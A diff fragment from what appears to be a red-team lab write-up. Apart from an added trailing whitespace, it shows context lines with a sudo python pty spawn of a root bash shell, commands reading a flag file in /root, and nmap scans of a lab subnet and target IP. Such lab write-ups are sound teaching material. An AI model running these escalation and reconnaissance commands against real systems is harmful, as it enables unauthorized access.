@@ -180,7 +180,7 @@ $ sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
     - **Command:** `cd /root/`  
     - **Command:** `ls`  
     - **Command:** `cat flag4.txt`
-  - Screenshot of `Flag 4`:
+  - Screenshot of `Flag 4`:  
 ![Flag 4](https://github.com/karma-786/Final-Project/blob/main/Final%20Project%20-%20KVP/Day%201%20%26%202/Target%201/flag4-1.png)  
 
 Target 2 Exposed Services Name of VM: Target 2 Operating System: Linux Purpose: Offensive Red Team IP Address: 192.168.1.115 root@Kali:~# nmap -sP 192.168.1.0/24 Nmap scan results for Target 2 reveal the below services and OS details: root@Kali:~# nmap -sV 192.168.1.115
